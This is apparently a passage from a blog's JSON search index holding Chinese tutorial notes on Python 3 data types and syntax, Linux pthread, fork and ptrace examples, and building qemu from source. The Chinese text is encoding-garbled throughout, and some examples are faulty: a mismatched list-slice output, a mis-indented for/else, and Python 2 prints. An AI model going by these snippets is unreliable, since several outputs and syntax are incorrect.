print(r'Hello\\nwroldï¼')\t\t# ä½¿ç”¨rè®©åæ–œæ ä¸è½¬ä¹‰\nHello\\nwroldï¼\t\t\t\t\t\n```\n\n- å­—ç¬¦ä¸²æ‹¼æ¥ï¼š`+`å’Œ`*`\n\n```shell\n>>> print('str'+'ing', 'my'*3)\nstring mymymy\n```\n\n- å­—ç¬¦ä¸²ç´¢å¼•ï¼š`[]`\n\n```shell\n>>> word = 'Python'\n>>> print(word[0], word[5])\nP n\n>>> print(word[-1], word[-6])\nn P\n```\n\n- å­—ç¬¦ä¸²åˆ‡ç‰‡ï¼š`[:]`\n\n```shell\n>>> word = 'ilovepython'\n>>> word[1:5]\n'love'\n>>> word[:]\n'ilovepython'\n>>> word[5:]\n'python'\n>>> word[-10:-6]\n'love'\n```\n\n## List\n\n> ä½¿ç”¨æ–¹æ‹¬å·ï¼Œé€—å·ç»„æˆçš„å…ƒç´ åˆ—è¡¨ï¼Œå…ƒç´ ç±»å‹å¯ä¸ç›¸åŒ\n\n```sh\n>>> a = ['him', 25, 100, 'her']\n>>> print(a)\n['him', 25, 100, 'her']\n```\n\n- åˆ—è¡¨ä¸²è”æ‹¼æ¥ï¼š`+`\n\n```shell\n>>> a = [1, 2, 3, 4, 5]\n>>> a + [6, 7, 8]\n[1, 2, 3, 4, 5, 6, 7, 8]\n```\n\n- åˆ—è¡¨ç´¢å¼•ï¼š`[]`\n\n```shell\n>>> a = ['him', 25, 100, 'her']\n>>> a[0]\n'him'\n>>> a[0] = 9\t\t\t#åˆ—è¡¨çš„å…ƒç´ å¯ä»¥æ›´æ”¹\n>>> print(a)\n[9, 25, 100, 'her']\t\t\n>>> letters[:] = []\t\t#æ¸…é™¤åˆ—è¡¨\n>>> letters\n```\n\n- åˆ—è¡¨åˆ‡ç‰‡ï¼š`[:]`\n\n```sh\n>>> a = [1, 2, 3, 4, 5,6]\n>>> a[2:5] = [13, 14, 15]\t\t# æ›¿æ¢ä¸€äº›å€¼\n>>> a\n[9, 2, 13, 14, 15, 6]\n>>> a[2:5] = []   \t\t# åˆ é™¤\n>>> a\n[9, 2, 6]\n```\n\n- append() pop()ç­‰æ–¹æ³•\n\n```shell\n# ä½¿ç”¨append()æ–¹æ³•åœ¨åˆ—è¡¨çš„æœ«å°¾æ·»åŠ æ–°é¡¹ï¼š\n>>> cubes = [1, 8, 27, 64, 125]\n>>> cubes.append(216)  # cubeåˆ—è¡¨ä¸­æ·»åŠ æ–°å€¼\n>>> cubes.append(343)  #  cubeåˆ—è¡¨ä¸­æ·»åŠ ç¬¬ä¸ƒä¸ªå€¼\n>>> cubes\n[1, 8, 27, 64, 125, 216, 343]\n```\n\n\n\n## Tuple\n\n> ä½¿ç”¨æ–¹æ‹¬å·ï¼Œé€—å·ç»„æˆçš„å…ƒç´ å…ƒç»„ï¼Œå…ƒç´ ç±»å‹å¯ä¸ç›¸åŒ\n\n```shell\n>>> a = (1991, 2014, 'physics', 'math')\n>>> print(a, type(a), len(a))\n(1991, 2014, 'physics', 'math') <class 'tuple'> 4\n>>> tup1 = () \t\t# ç©ºå…ƒç»„\n>>> tup2 = (20,)\t# åŒ…å«ä¸€ä¸ªå…ƒç´ çš„å…ƒç»„ï¼Œæ³¨æ„åé¢æœ‰é€—å·\n```\n\n- å…ƒç»„æ‹¼æ¥ï¼š`+`\n\n```shell\n>>> tup1, tup2 = (1, 2, 3), (4, 5, 6)\n>>> print(tup1+tup2)\n(1, 2, 3, 4, 5, 6)\n```\n\n- å…ƒç»„ç´¢å¼•ï¼š`[]`\n\n```\n>>> tup1 = (1,2,3)\n>>> print(tup1[0])\n1\n```\n\n- å…ƒç»„åˆ‡ç‰‡ï¼š`[:]`\n\n```\n>>> tup1 = (1,2,3)\n>>> print(tup1[0:1])\n(1,)\n```\n\n- åˆ é™¤å…ƒç»„\n\n```shell\n>>> del tup1\n```\n\n- å…ƒç»„çš„å†…ç½®å‡½æ•°\n\n```shell\n>>> tuple1 = ('Google', 'W3CSchool', 'Taobao')\n>>> len(tuple1)\t\t# è®¡ç®—å…ƒç»„çš„å…ƒç´ ä¸ªæ•°\n3\n\n>>> tuple2 = ('5', '4', '8')\n>>> max(tuple2)\t\t# è¿”å›å…ƒç»„ä¸­å…ƒç´ çš„æœ€å¤§å€¼\n'8'\n\n>>> tuple2 = ('5', '4', '8')\n>>> min(tuple2)\t\t# è¿”å›å…ƒç»„ä¸­å…ƒç´ çš„æœ€å°å€¼\n'4'\n\n>>> list1= ['Google', 'Taobao', 'W3CSchool', 'Baidu']\n>>> tuple1=tuple(list1)\t\t# å°†liståˆ—è¡¨è½¬æ¢ä¸ºå…ƒç»„\n>>> tuple1\n('Google', 'Taobao', 'W3CSchool', 'Baidu')\n\n>>> import operator\n>>> dict1 = (1, 2, 3)\n>>> dict2 = ('a', 'b', 'c')\n>>> operator.eq(dict1, dict2)\t\t# æ¯”è¾ƒä¸¤ä¸ªå…ƒç»„çš„å…ƒç´ \nFalse\n```\n\n## Set\n\n> ä¸€ä¸ªæ— åºä¸é‡å¤å…ƒç´ çš„é›†åˆï¼Œä½¿ç”¨å¤§æ‹¬å·{}æˆ–set()å‡½æ•°åˆ›å»º\n>\n> tipsï¼š**set()åˆ›å»ºç©ºé›†åˆï¼Œ{}åˆ›å»ºç©ºå­—å…¸**\n\n```shell\n>>> student = {'Tom', 'Jim', 'Mary', 'Tom', 'Jack', 'Rose'}\n>>> print(student)   \t\t# é‡å¤çš„å…ƒç´ è¢«è‡ªåŠ¨å»æ‰\n{'Jim', 'Jack', 'Mary', 'Tom', 'Rose'}\n>>> 'Rose' in student \t\t # membership testingï¼ˆæˆå‘˜æµ‹è¯•ï¼‰\nTrue\n>>> # setå¯ä»¥è¿›è¡Œé›†åˆè¿ç®—\n... \n>>> a = set('abracadabra')\n>>> b = set('alacazam')\n>>> a\n{'a', 'b', 'c', 'd', 'r'}\n>>> a - b     \t\t# aå’Œbçš„å·®é›†\n{'b', 'd', 'r'}\n>>> a | b    \t\t # aå’Œbçš„å¹¶é›†\n{'l', 'm', 'a', 'b', 'c', 'd', 'z', 'r'}\n>>> a & b    \t\t # aå’Œbçš„äº¤é›†\n{'a', 'c'}\n>>> a ^ b    \t\t # aå’Œbä¸­ä¸åŒæ—¶å­˜åœ¨çš„å…ƒç´ \n{'l', 'm', 'b', 'd', 'z', 'r'}\n```\n\n## Dictionary\n\n> ä¸€ç§æ˜ å°„ç±»å‹ï¼ˆmapping typeï¼‰ï¼Œåœ¨å¤§æ‹¬å·{}ä¸­åŒ…å«ä¸€äº›æ— åºçš„é”®å€¼å¯¹ï¼Œ**å…³é”®å­—å¿…é¡»ä½¿ç”¨ä¸å¯å˜ç±»å‹**\n\n```shell\n>>> tel = {} \t\t \t\t# åˆ›å»ºç©ºå­—å…¸\n>>> tel = {'Jack':1557, 'Tom':1320, 'Rose':1886}\n>>> tel\n{'Tom': 1320, 'Jack': 1557, 'Rose': 1886}\n>>> tel['Jack']   \t\t\t# é€šè¿‡keyæŸ¥è¯¢\n1557\n>>> del tel['Rose']  \t\t# åˆ é™¤ä¸€ä¸ªé”®å€¼å¯¹\n>>> tel['Mary'] = 4127  \t# æ·»åŠ ä¸€ä¸ªé”®å€¼å¯¹\n>>> tel\n{'Tom': 1320, 'Jack': 1557, 'Mary': 4127}\n>>> list(tel.keys())  \t\t# è¿”å›æ‰€æœ‰keyç»„æˆçš„list\n['Tom', 'Jack', 'Mary']\n>>> sorted(tel.keys()) \t\t# æŒ‰keyæ’åº\n['Jack', 'Mary', 'Tom']\n>>> 'Tom' in tel       \t\t# æˆå‘˜æµ‹è¯•\nTrue\n>>> 'Mary' not in tel  \t\t# æˆå‘˜æµ‹è¯•\nFalse\n```\n\nä½¿ç”¨dict()æ„é€ å‡½æ•°ä»sequenceä¸­æ„é€ å­—å…¸ï¼Œä¹Ÿå¯è¿›è¡Œæ¨å¯¼ã€‚ï¼ˆstringã€list å’Œ tuple éƒ½å±äº sequenceï¼ˆåºåˆ—ï¼‰ï¼‰\n\n```shell\n>>> dict([('sape', 4139), ('guido', 4127), ('jack', 4098)])\n{'jack': 4098, 'sape': 4139, 'guido': 4127}\n\n>>> {x: x**2 for x in (2, 4, 6)}\n{2: 4, 4: 16, 6: 36}\n\n>>> dict(sape=4139, guido=4127, jack=4098)\n{'jack': 4098, 'sape': 4139, 'guido': 4127}\n```\n\n- åˆ é™¤å­—å…¸å…ƒç´ \n\n```python\ndict = {'Name': 'W3CSchool', 'Age': 7, 'Class': 'First'}\n\ndel dict['Name'] \t\t# åˆ é™¤é”® 'Name'\ndict.clear()     \t\t# åˆ é™¤å­—å…¸\ndel dict         \t\t# åˆ é™¤å­—å…¸\n```\n\nå­—å…¸ç±»å‹æœ‰ä¸€äº›å†…ç½®å‡½æ•°ï¼Œä¾‹å¦‚ clear()ã€keys()ã€values() ç­‰ã€‚\n\n# è¯­æ³•åŠAPI\n\n## æ¡ä»¶æ§åˆ¶\n\n```python\nif condition_1:\n    statement_block_1\nelif condition_2:\n    statement_block_2\nelse:\n    statement_block_3\n```\n\n## å¾ªç¯\n\n```python\nwhile åˆ¤æ–­æ¡ä»¶ï¼š\n    statements\n```\n\n```python\nfor <variable> in <sequence>:\n    <statements>\nelse:\n    <statements>\n```\n\n```python\n# ä½¿ç”¨breakè·³å‡ºå½“å‰å¾ªç¯ä½“\nedibles = [\"ham\", \"spam\",\"eggs\",\"nuts\"]\n\nfor food in edibles:\n    if food == \"spam\":\n        print(\"No more spam please!\")\n        break\n    print(\"Great, delicious \" + food)\n    else:\n        print(\"I am so glad: No spam!\")\n\nprint(\"Finally, I finished stuffing myself\")\n```\n\n- range()å‡½æ•°\n\n```shell\n>>> for i in range(5):\n...     print(i)\n...\n0\n1\n2\n3\n4\n\n>>> for i in range(5,9) :\n  print(i) \n5\n6\n7\n8\n\n>>> for i in range(0, 10, 3) :\n    print(i)\n0\n3\n6\n9\n\n>>> for i in range(-10, -100, -30) :\n   print(i)\n-10\n-40\n-70\n\n>>> list(range(5))\n[0, 1, 2, 3, 4]\n```\n\n- continueå’Œpass\n\n## è¿­ä»£å™¨ä¸ç”Ÿæˆå™¨\n\n> è¿­ä»£å™¨çš„ä¸¤ä¸ªåŸºæœ¬æ–¹æ³•ï¼šiter()å’Œnext()\n\n```shell\n# å­—ç¬¦ä¸²ï¼Œåˆ—è¡¨æˆ–å…ƒç»„å¯¹è±¡éƒ½å¯ç”¨äºåˆ›å»ºè¿­ä»£å™¨\n>>> list=[1,2,3,4]\n>>> it = iter(list)    # åˆ›å»ºè¿­ä»£å™¨å¯¹è±¡\n>>> print(next(it))   # è¾“å‡ºè¿­ä»£å™¨çš„ä¸‹ä¸€ä¸ªå…ƒç´ \n1\n>>> print(next(it))\n2\n\n# ä½¿ç”¨forè¯­å¥éå†è¿­ä»£å™¨å¯¹è±¡\nlist=[1,2,3,4]\nit = iter(list)    # åˆ›å»ºè¿­ä»£å™¨å¯¹è±¡\nfor x in it:\n    print(x, end=\" \")\n# æ‰§è¡Œç»“æœä¸ºï¼š1 2 3 4\n\n# ä½¿ç”¨nextå‡½æ•°\nimport sys         # å¼•å…¥ sys æ¨¡å—\nlist=[1,2,3,4]\nit = iter(list)    # åˆ›å»ºè¿­ä»£å™¨å¯¹è±¡\nwhile True:\n    try:\n        print(next(it))\n    except StopIteration:\n        sys.exit()\n#æ‰§è¡Œå®Œçš„è¾“å‡º\n1\n2\n3\n4\n```\n\n> ç”Ÿæˆå™¨æ˜¯ä½¿ç”¨äº†yieldçš„å‡½æ•°\n\nåœ¨è°ƒç”¨ç”Ÿæˆå™¨è¿è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œæ¯æ¬¡é‡åˆ° yield æ—¶å‡½æ•°ä¼šæš‚åœå¹¶ä¿å­˜å½“å‰æ‰€æœ‰çš„è¿è¡Œä¿¡æ¯ï¼Œè¿”å› yield çš„å€¼ã€‚å¹¶åœ¨ä¸‹ä¸€æ¬¡æ‰§è¡Œ next() æ–¹æ³•æ—¶ä»å½“å‰ä½ç½®ç»§ç»­è¿è¡Œã€‚\n\n```python\nimport sys\n\ndef fibonacci(n): # ç”Ÿæˆå™¨å‡½æ•° - æ–æ³¢é‚£å¥‘\n    a, b, counter = 0, 1, 0\n    while True:\n        if (counter > n): \n            return\n        yield a\n        a, b = b, a + b\n        counter += 1\nf = fibonacci(10) # f æ˜¯ä¸€ä¸ªè¿­ä»£å™¨ï¼Œç”±ç”Ÿæˆå™¨è¿”å›ç”Ÿæˆ\n\nwhile True:\n    try:\n        print (next(f), end=\" \")\n    except StopIteration:\n        sys.exit()\n```\n\nè¾“å‡ºï¼š\n\n```\n0 1 1 2 3 5 8 13 21 34 55\n```\n\n## å‡½æ•°\n\n```python\ndef  å‡½æ•°åï¼ˆå‚æ•°åˆ—è¡¨ï¼‰ï¼š\n\tå‡½æ•°ä½“\n```\n\n- ä¸å®šé•¿å‚æ•°ï¼š`*`\n\n```python\ndef printinfo( arg1, *vartuple ):\n   \"æ‰“å°ä»»ä½•ä¼ å…¥çš„å‚æ•°\"\n   print \"è¾“å‡º: \"\n   print arg1\n   for var in vartuple:\n      print var\n   return;\n \n# è°ƒç”¨printinfo å‡½æ•°\nprintinfo( 10 );\nprintinfo( 70, 60, 50 );\n\n# è¾“å‡º:\n# 10\n# è¾“å‡º:\n# 70\n# 60\n# 50\n```\n\n- åŒ¿åå‡½æ•°ï¼š`lambda`\n\n> lambda [arg1 [,arg2,.....argn]]:expression\n\n```python\nsum = lambda arg1, arg2: arg1 + arg2;\n \n#è°ƒç”¨sumå‡½æ•°\nprint \"Value of total : \", sum( 10, 20 )\nprint \"Value of total : \", sum( 20, 20 )\n```\n\n## è¾“å…¥å’Œè¾“å‡º\n\nè¾“å…¥ï¼šinput()ï¼Œread()\n\nè¾“å‡ºï¼šprint()ï¼Œwrite()ï¼Œstr.format()ï¼Œsys.stdout()\n\n```shell\n>>> for x in range(1, 11):\n...     print('{0:2d} {1:3d} {2:4d}'.format(x, x*x, x*x*x))\n...\n 1   1    1\n 2   4    8\n 3   9   27\n 4  16   64\n 5  25  125\n 6  36  216\n 7  49  343\n 8  64  512\n 9  81  729\n10 100 1000\n\n>>> print('bbb'.ljust(10),'==>','ccc'.rjust(10))\t\t# str.rjust()ä¸str.ljust()\nbbb        ==>        ccc\n\n>>> print('aaa'.center(10),'bbb'.center(10))\t\t\t# str.center()\n   aaa        bbb \n   \n>>> print('aaa'.zfill(10))\t\t\t\t# st=r.zfill()\n0000000aaa\n```\n\nå°†å€¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼šrepr()ï¼Œstr()\n\n```\n>>> repr('\\x64')\n\"'d'\"\n>>> str('\\x64')\n'd'\n```\n\n## è¯»å†™æ–‡ä»¶\n\n> open() å°†ä¼šè¿”å›ä¸€ä¸ª file å¯¹è±¡\n\n```python\nopen(filename, mode)\t\t\t\t\t# è‹¥ä¸æä¾›modeçš„è¯ï¼Œé»˜è®¤ä»¥åªè¯»æ–¹å¼æ‰“å¼€\n>>> f = open('/tmp/workfile', 'w')     # ä»¥åªå†™çš„æ–¹å¼æ‰“å¼€æ–‡ä»¶\n>>> f = open('/tmp/workfile','r')\t\t# ä»¥åªè¯»çš„æ–¹å¼æ‰“å¼€æ–‡ä»¶\n>>> f = open('/tmp/workfile','a')\t\t# ä»¥è¿½åŠ çš„æ–¹å¼æ‰“å¼€æ–‡ä»¶\n>>> f = open('/tmp/workfile','r+')\t\t# ä»¥è¯»å†™çš„æ–¹å¼æ‰“å¼€æ–‡ä»¶\n```\n\nf.read(n)ï¼šè¯»å–æ–‡ä»¶å†…å®¹ï¼Œä»¥å­—ç¬¦ä¸²æˆ–å­—èŠ‚å¯¹è±¡è¿”å›ã€‚næŒ‡å®šè¯»å–å¤§å°ï¼Œè‹¥nä¸º0æˆ–è´Ÿæ•°åˆ™è¿”å›æ–‡ä»¶æ‰€æœ‰å†…å®¹\n\nf.readline()ï¼šè¯»å–æ–‡ä»¶ä¸­çš„ä¸€è¡Œ'\\n'ï¼Œå¦‚æœè¿”å›ç©ºå­—ç¬¦ä¸²åˆ™è¯´æ˜å·²ç»è¯»å–åˆ°æœ€åä¸€è¡Œ\n\n```shell\n>>> f.readline()\t\n'This is the first line of the file.\\n'\n>>> f.readline()\n'Second line of the file\\n'\n>>> f.readline()\n''\n```\n\nf.readlines() ï¼šè¿”å›æ–‡ä»¶åŒ…å«çš„æ‰€æœ‰è¡Œï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªlistã€‚\n\n```shell\n>>> f.readlines()\n['line1 line11\\n', 'line2 line22\\n', 'line3 line33\\n']\n>>> f.readlines(20)\n['line1 line11\\n', 'line2 line22\\n']\n```\n\nf.write()ï¼šf.write(string) å°† string å†™å…¥åˆ°æ–‡ä»¶ä¸­, ç„¶åè¿”å›å†™å…¥çš„å­—ç¬¦æ•°\n\n```shell\n>>> f.write('This is a test\\n')\n15\n\n>>> value = ('the answer', 42)\t\t# è‹¥å†™å…¥çš„ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™éœ€è¦å…ˆè¿›è¡Œè½¬æ¢\n>>> s = str(value)\n>>> f.write(s)\n18\n```\n\nf.tell()ï¼šè¿”å›æ–‡ä»¶å¯¹è±¡å½“å‰æ‰€å¤„çš„ä½ç½®ï¼Œæ˜¯ä»æ–‡ä»¶å¼€å¤´ç®—èµ·çš„å­—èŠ‚æ•°ã€‚\n\nf.seek()ï¼šæ”¹å˜æ–‡ä»¶å½“å‰ä½ç½®ã€‚ `f.seek(offset, from_what)`\n\n```\nfrom_what çš„å€¼, å¦‚æœæ˜¯ 0 è¡¨ç¤ºå¼€å¤´, å¦‚æœæ˜¯ 1 è¡¨ç¤ºå½“å‰ä½ç½®, 2 è¡¨ç¤ºæ–‡ä»¶çš„ç»“å°¾ï¼Œä¾‹å¦‚ï¼š\n\nseek(x, 0) ï¼š ä»èµ·å§‹ä½ç½®å³æ–‡ä»¶é¦–è¡Œé¦–å­—ç¬¦å¼€å§‹ç§»åŠ¨ x ä¸ªå­—ç¬¦\nseek(x, 1) ï¼š è¡¨ç¤ºä»å½“å‰ä½ç½®å¾€åç§»åŠ¨xä¸ªå­—ç¬¦\nseek(-x, 2)ï¼šè¡¨ç¤ºä»æ–‡ä»¶çš„ç»“å°¾å¾€å‰ç§»åŠ¨xä¸ªå­—ç¬¦\n```\n\nf.close()ï¼šå…³é—­æ–‡ä»¶ã€‚\n\n# æ ‡å‡†åº“æ¦‚è§ˆ\n\n[W3Cschool-æ ‡å‡†åº“æ¦‚è§ˆ](https://www.w3cschool.cn/python3/python3-stdlib.html)\n\n# tips\n\n- å¤åˆèµ‹å€¼\n\n```python\n# Fibonacci series: æ–æ³¢çº³å¥‘æ•°åˆ—\n# ä¸¤ä¸ªå…ƒç´ çš„æ€»å’Œç¡®å®šäº†ä¸‹ä¸€ä¸ªæ•°\na, b = 0, 1\nwhile b < 10:\n    print(b)\n    a, b = b, a + b;\n```\n\n- endå…³é”®å­—\n\n>  ç”¨äºå°†ç»“æœè¾“å‡ºåˆ°åŒä¸€è¡Œï¼Œæˆ–è€…åœ¨è¾“å‡ºçš„æœ«å°¾æ·»åŠ ä¸åŒçš„å­—ç¬¦\n\n```python\na, b = 0, 1\nwhile b < 1000:\n    print(b,end=',')\n    a, b = b, a + b;\n```","categories":["ç¼–ç¨‹è¯­è¨€"]},{"title":"linuxä¸‹å¤šçº¿ç¨‹ç¼–ç¨‹ä¸è°ƒè¯•","url":"/2021/01/23/pthread-fork-ptrace/","content":"\n# linuxä¸‹å¤šçº¿ç¨‹ç¼–ç¨‹ä¹‹pthread\n\n\n`pthread_self()` å¯è·å–å½“å‰çº¿ç¨‹å·ã€‚\n\n`getpid()` å¯è·å–å½“å‰è¿›ç¨‹å·ã€‚\n\n`pthread_join(t1, NULL);` æˆ–è€…`pthread_exit(NULL)` å¯ä»¥åˆ†åˆ«çœ‹åšä¸€ç§åŒæ­¥æ–¹å¼ï¼Œç­‰æ‰€æœ‰å­çº¿ç¨‹æ‰§è¡Œå®Œåmainå‡½æ•°æ‰é€€å‡ºã€‚\n\nå¦‚ä¸‹ç¤ºä¾‹ä»£ç å¯ä»¥çœ‹å‡ºè¿™ä»¥ä¸Šå„å‡½æ•°çš„ä½œç”¨ï¼š\n\n```c\n//gcc test.c lpthread -o test\n//test.c\n#include <stdio.h>   //printf\n#include <pthread.h> //pthread_xxx\n\nvoid *thread_func(void *p)\n{\n    long i = (long)p;\n    pthread_t tid = pthread_self();\n    for (int j = 0; j < 5; j++)\n    {\n        printf(\"thread id is:%lu --- %d --- %d\\n\",tid,i,j);\n    }\n\n    return NULL;\n}\n\nint main()\n{\n    pthread_t t1, t2;\n    pid_t pid = getpid();\n    printf(\"PID is: %lu\\n\",pid);\n    pthread_create(&t1, 0, thread_func, (void *)1);\n    pthread_create(&t2, 0, thread_func, (void *)2);\n\n//    pthread_join(t1, NULL);\n//    pthread_join(t2, NULL);\n//    pthread_exit(NULL);\n    return 0;\n}\n```\n\nå‚è€ƒï¼š\n\n[pthreadå¸¸ç”¨å‡½æ•°](https://zhuanlan.zhihu.com/p/86208167)\n\n[pthreadå¹¶è¡Œç¼–ç¨‹å…¥é—¨](https://segmentfault.com/a/1190000020655588)\n\n# linuxä¸‹å¤šè¿›ç¨‹ç¼–ç¨‹ä¹‹fork\n\nfork()å‡½æ•°é€šè¿‡ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€ä¸ªä¸åŸæ¥è¿›ç¨‹å‡ ä¹å®Œå…¨ç›¸åŒçš„è¿›ç¨‹ã€‚\n- åœ¨çˆ¶è¿›ç¨‹ä¸­ï¼Œforkè¿”å›æ–°åˆ›å»ºå­è¿›ç¨‹çš„è¿›ç¨‹IDï¼›\n- åœ¨å­è¿›ç¨‹ä¸­ï¼Œforkè¿”å›0ï¼›\n- å¦‚æœå‡ºç°é”™è¯¯ï¼Œforkè¿”å›ä¸€ä¸ªè´Ÿå€¼ï¼›\nå¦‚ä¸‹ä»£ç å¯ä»¥å¸®åŠ©æˆ‘ä»¬äº†è§£fork()\n\n```c\n#include<unistd.h>\n#include<stdio.h>\n#include<stdlib.h>\n\nint main () \n{ \n\tpid_t fpid; \n\tint count=0;\n\tfpid=fork(); \n\tif (fpid < 0) \n\t\tprintf(\"error in fork!\\n\"); \n\telse if (fpid == 0) {\n\t\tprintf(\"i am the child process, getpid() is: %d,getppid() is: %d,fpid is: %d\\n\",getpid(),getppid(),fpid); \n\t\tcount++;\n\t}\n\telse {\n\t\tprintf(\"i am the parent process, getpid() is: %d,getppid() is: %d,fpid is: %d\\n\",getpid(),getppid(),fpid); \n\t\tcount++;\n        count++;\n\t}\n\tprintf(\"count is: %d\\n\",count);\n\treturn 0;\n}\n```\n\nå‚è€ƒï¼š\n\n[linuxä¸­forkï¼ˆï¼‰å‡½æ•°è¯¦è§£ï¼ˆåŸåˆ›ï¼ï¼å®ä¾‹è®²è§£ï¼‰](https://blog.csdn.net/jason314/article/details/5640969)\n\n\n# ptrace\n\n- ptraceè¿½è¸ªå­è¿›ç¨‹ç³»ç»Ÿè°ƒç”¨å·\n\n```c\n// 64 bit system\n#include <sys/ptrace.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <sys/reg.h>\n#include <sys/user.h>   /* For constants \n                                   ORIG_EAX etc */\nint main()\n{\n    pid_t child;\n    long orig_eax;\n    long test;\n    child = fork();\n    if(child == 0) {\n        ptrace(PTRACE_TRACEME, 0, NULL, NULL);\n        execl(\"/bin/ls\", \"ls\", NULL);\n    }\n    else {\n        wait(NULL);\n        orig_eax = ptrace(PTRACE_PEEKUSER,child, 8 * ORIG_RAX,NULL);\n        printf(\"The child made a system call %ld\\n\",orig_eax);\n        ptrace(PTRACE_CONT, child, NULL, NULL);\n    }\n    return 0;\n}\n```\n- ptraceè¿›ç¨‹é™„ç€è°ƒè¯•\n\n```c\n#include <sys/ptrace.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/reg.h>\n#include <sys/user.h>   /* For constants \n                                   ORIG_EAX etc */\n\nint main(int argc, char *argv[])\n{   \n    pid_t traced_process;\n    struct user_regs_struct regs;\n    long ins;\n    if(argc != 2) {\n        printf(\"Usage: %s <pid to be traced> \",argv[0]);\n        exit(1);\n    }\n    traced_process = atoi(argv[1]);\n    ptrace(PTRACE_ATTACH, traced_process, \n           NULL, NULL);\n    wait(NULL);\n    ptrace(PTRACE_GETREGS, traced_process, \n           NULL, &regs);\n    printf(\"regs.rip is: 0x%llx\\n\",regs.rip);\n    ins = ptrace(PTRACE_PEEKTEXT, traced_process, \n                 regs.rip, NULL);\n    printf(\"RIP: %llx Instruction executed: %lx\\n\",regs.rip, ins);\n    ptrace(PTRACE_DETACH, traced_process, \n           NULL, NULL);\n    return 0;\n}\n```\nå‚è€ƒï¼š\n\n[Linuxæ²™ç®±ä¹‹ptrace](https://blog.betamao.me/2019/02/02/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bptrace/)\n\n[ptraceè¿è¡ŒåŸç†åŠä½¿ç”¨è¯¦è§£](https://blog.csdn.net/edonlii/article/details/8717029)","categories":["ç¼–ç¨‹è¯­è¨€"]},{"title":"linuxä¸‹çš„æºç ç¼–è¯‘","url":"/2021/01/20/source-code-compile/","content":"\n# æºç ç¼–è¯‘\n\næŠŠè¿™ç¯‡å‚è€ƒæ–‡ç« [linuxä¸‹æºä»£ç çš„ç¼–è¯‘å®‰è£…å…¥é—¨](https://www.jianshu.com/p/39101098ebbe)å®Œæ•´çœ‹å¹¶åŠ¨æ‰‹å®è·µä¸‹æ¥ï¼Œå¯¹æºç ç¼–è¯‘å°±æœ‰äº†å®è§‚ä¸Šç²—ç•¥çš„äº†è§£ã€‚\n\nå¦å¤–è¿˜éœ€è¦äº†è§£å¤šçº§ç›®å½•ä¸‹makefileçš„ç¼–å†™åŠç¼–è¯‘è¿‡ç¨‹ã€‚\n\n## ä¸‰æ­¥èµ°\n\n### configure - æ£€æŸ¥\n\n```shell\nconfigure --prefix=dir/\n# æŒ‡å®šå®‰è£…ç›®å½•dir/ï¼Œåç»­make installæ—¶ä¼šå®‰è£…åˆ°dir/ç›®å½•ä¸‹ï¼ˆä¸æŒ‡å®šçš„è¯ï¼Œé»˜è®¤æ˜¯/usr/local/binç›®å½•ï¼‰\n# å®‰è£…çš„äºŒè¿›åˆ¶æ–‡ä»¶å­˜æ”¾åœ¨dir/bin/ç›®å½•ä¸‹\n# å®‰è£…çš„èµ„æºæ–‡ä»¶å­˜æ”¾åœ¨dir/share/ç›®å½•ä¸‹\n```\n\n```shell\nconfigure --help\n# æŸ¥çœ‹è¯¦ç»†çš„å¸®åŠ©è¯´æ˜ï¼Œå¦‚--sys-config=xxxè¿›è¡Œå‚æ•°è®¾å®šï¼Œ--with/--enable/--without/--disableç­‰å¯¹ç¼–è¯‘è¿‡ç¨‹è¿›è¡Œæ§åˆ¶\n```\n\n### make - ç¼–è¯‘\n\n> é™¤äº†æœ‰äº›ç”¨perlæˆ–pythonç¼–å†™çš„è½¯ä»¶ï¼ˆä½¿ç”¨perlæˆ–pythonè¿›è¡Œç¼–è¯‘ï¼‰ï¼Œå¤§éƒ¨åˆ†æºä»£ç éƒ½æ˜¯éœ€è¦é€šè¿‡makeè¿›è¡Œç¼–è¯‘çš„\n\nmakeæ˜¯linuxå¼€å‘å¥—ä»¶é‡Œé¢è‡ªåŠ¨åŒ–ç¼–è¯‘çš„ä¸€ä¸ªæ§åˆ¶ç¨‹åºï¼Œå®ƒé€šè¿‡makefileé‡Œçš„ç¼–è¯‘è§„åˆ™è‡ªåŠ¨è°ƒç”¨gccï¼Œldç­‰è¿›è¡Œç¼–è¯‘ã€‚makefileå¯ä»¥è‡ªè¡Œç¼–å†™ï¼Œä¹Ÿå¯ä»¥é€šè¿‡configureè„šæœ¬æ ¹æ®ç»™å®šçš„å‚æ•°å’Œç³»ç»Ÿç¯å¢ƒç”Ÿæˆã€‚\n\n### make install - å®‰è£…\n\n> makeé€šè¿‡åŠ 'å‚æ•°'`make install`æˆ–`make uninstall`æ¥è¿›è¡Œå®‰è£…æˆ–å¸è½½ï¼Œè‹¥ä¸åŠ 'å‚æ•°'åˆ™è¡¨ç¤ºè¿›è¡Œé»˜è®¤çš„æºä»£ç ç¼–è¯‘\n\né»˜è®¤æƒ…å†µä¸‹ï¼Œé€šå¸¸éœ€è¦rootæƒé™æ¥è¿è¡Œ`make install`ï¼Œå› ä¸ºå¾…å†™å…¥ç›®å½•å¯èƒ½æƒé™è¾ƒé«˜ï¼ˆå¦‚/usr/local/binï¼‰ã€‚\n\nå¯¹éƒ¨åˆ†è½¯ä»¶è€Œè¨€ï¼Œéœ€è¦åœ¨`make install`å‰å…ˆè¿è¡Œ`make check`æˆ–`make test`æ¥è¿›è¡Œä¸€äº›æµ‹è¯•ã€‚\n\n## ç¼–è¯‘qemu\n\nä¸‹è½½qemuæºç \n\n```shell\nwget https://download.qemu.org/qemu-5.2.0.tar.xz\ntar Jxvf qemu-5.2.0.tar.xz\ncd qemu-5.2.0\ncd ..\nmkdir -p build-qemu\n```\n\nå®‰è£…ninja\n\n```shell\nsudo apt install re2c\ngit clone git://github.com/ninja-build/ninja.git && cd ninja\n./configure.py --bootstrap\ncp ninja /usr/bin/\nninja --version\n```\n\nç¼–è¯‘qemu\n\n```shell\nsudo apt install pkg-config libglib2.0-dev libmount-dev python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential autoconf automake libfreetype6-dev libtheora-dev libtool libvorbis-dev pkg-config texinfo 